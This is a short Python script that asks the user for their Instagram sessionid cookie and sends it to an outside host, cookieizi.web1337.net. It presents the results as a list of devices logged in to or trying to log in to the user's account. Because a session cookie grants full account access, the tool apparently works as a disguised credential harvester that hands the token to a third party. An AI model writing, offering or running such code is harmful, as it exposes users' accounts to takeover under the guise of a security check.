import requests
import json


sessionid = str(input("sessionid : "))
userid = sessionid.split("%3A")[0]
url = f"http://cookieizi.web1337.net/instagram/?userid={userid}&sessionid={sessionid}"

headers = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 ',
  'Accept-Language': 'en-US,en;q=0.5',
  'Cookie': '__test=68af13d79153d6c86afa640bf5fc6334; PHPSESSID=489141a41bbb182fda865aacad7cb61f'
}

response = requests.request("GET", url, headers=headers)
json_data = json.loads(response.text)
print('This Devices Want Accept To Login Into Your Account :')
print('\n')
print(json_data['data']['suspicious_logins'])
print('\n')
print('This Devices Was Login Into Your Account : ')
print((json_data['data']['sessions']))
